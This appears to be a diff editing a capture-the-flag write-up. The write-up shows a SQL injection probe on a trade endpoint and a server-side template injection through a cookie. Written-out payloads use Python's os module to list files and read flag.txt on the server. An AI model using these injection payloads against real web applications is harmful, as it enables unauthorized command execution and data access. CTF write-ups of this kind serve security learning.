@@ -32,7 +32,7 @@ Now logged in we observe two things:
 
 Lets see if there's a SQL injection on the query!
 
-We can confirm that there is a sqli with the following query:
+We can confirm that there is a SQL injection with the following query:
 ```
 /trade?coin=' AND 1=2 --
 ```
@@ -69,7 +69,7 @@ Now logged in, we are prompted to "get the flag and beat the maze". The cookie `
 
 We can also observe that the global variable `name` is set to `skid`, which is the same value that the cookie is set to by default. Perhaps this could be a SSTI (Server Side Template Injection).
 
-Setting the cookie to `{{1+1}}`, the name variable is set to 
+Setting the cookie to `{{1+1}}`, the name variable is set to :
 ```javascript
 var name = "2";
 ```
@@ -79,9 +79,9 @@ Setting the cookie to `{{3 * '3'}}`, we determine that the template engine is wr
 var name = "333";
 ```
 
-Knowing the template engine, we can easily execute shell commands via the os module. 
+Knowing the template engine, we can easily execute shell commands via pythons os module. 
 
-Using `ls` we see that there is a file called `flag.txt` in the current directory.
+Using the shell command `ls` we see that there is a file called `flag.txt` in the current directory.
 ```
 name={{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
 
@@ -101,8 +101,10 @@ wsgi.py
 ";
 ```
 
-Running `cat flag.txt` in the SSTI gives us the flag:
+Running `cat flag.txt` gives us the flag:
 
 ```
+name={{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+
 flag{u_35c@p3d_7h3_m@z3_5ucc3ssfu77y9933}
 ```
